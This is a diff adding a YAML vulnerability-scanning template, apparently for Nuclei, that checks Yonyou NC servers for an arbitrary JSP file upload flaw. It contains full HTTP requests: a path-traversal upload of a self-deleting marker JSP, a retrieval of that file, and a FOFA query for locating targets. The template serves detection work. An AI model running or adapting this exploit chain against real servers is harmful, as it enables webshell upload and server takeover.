@@ -1,0 +1,60 @@
+id: yonyou-nc-uploadFile-upload
+info:
+  name: 用友NC mp-uploadControl存在文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    通过mp模块进行任意文件上传，从而上传webshell实现控制服务器。
+  reference:
+    - https://xz.aliyun.com/t/13171?time__1311=mqmxnDBDcD27Kq05DIYqCqTrD9C%3DHTqDuQoD&alichlgref=https%3A%2F%2Fwww.bing.com%2F
+    - https://security.yonyou.com/#/noticeInfo?id=342
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: TVE-2024-105092320
+    cvss-score: 10.0
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-01-15
+    version: 用友NC
+    fofa-query: app="用友-UFIDA-NC"
+  tags: fileupload,rce,yonyoump,yonyou
+
+
+
+variables:
+  filename: "{{rand_base(6)}}" 
+  
+http:
+  - raw:
+      - |-
+        POST /mp/login/../uploadControl/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+        Connection: close
+        Content-Length: 421
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Disposition: form-data; name="submit"
+
+        submit
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp--
+      - |-
+        GET /mp/uploadFileDir/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
